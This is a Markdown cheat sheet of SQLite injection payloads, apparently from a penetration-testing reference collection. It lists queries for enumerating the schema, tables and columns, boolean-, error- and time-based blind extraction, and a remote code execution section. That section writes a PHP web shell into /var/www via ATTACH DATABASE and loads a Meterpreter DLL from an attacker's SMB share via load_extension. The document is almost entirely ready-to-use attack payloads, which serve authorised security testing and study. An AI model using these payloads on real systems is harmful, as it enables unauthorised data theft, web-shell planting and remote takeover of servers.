# SQLite Injection

> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 


## Summary

* [SQLite Comments](#sqlite-comments)
* [SQLite Version](#sqlite-version)
* [String Based - Extract Database Structure](#string-based---extract-database-structure)
* [Integer/String Based - Extract Table Name](#integerstring-based---extract-table-name)
* [Integer/String Based - Extract Column Name](#integerstring-based---extract-column-name)
* [Boolean - Count Number Of Tables](#boolean---count-number-of-tables)
* [Boolean - Enumerating Table Name](#boolean---enumerating-table-name)
* [Boolean - Extract Info](#boolean---extract-info)
* [Boolean - Error Based](#boolean---error-based)
* [Time Based](#time-based)
* [Remote Code Execution](#remote-code-execution)
    * [Attach Database](#attach-database)
    * [Load_extension](#load_extension)
* [References](#references)


## SQLite Comments

```sql
--
/**/
```

## SQLite Version

```sql
select sqlite_version();
```


## String Based - Extract Database Structure

```sql
SELECT sql FROM sqlite_schema
```
if sqlite_version > 3.33.0 
```sql
SELECT sql FROM sqlite_master
```


## Integer/String Based - Extract Table Name

```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```


## Integer/String Based - Extract Column Name

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

For a clean output

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

Cleaner output

```sql
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
```


## Boolean - Count Number Of Tables

```sql
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating Table Name

```sql
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract Info

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

### Boolean - Extract Info (order by)

```sql
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## Boolean - Error Based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## Time Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```


## Remote Code Execution

### Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

### Load_extension

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

Note: By default this component is disabled.


## References

* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
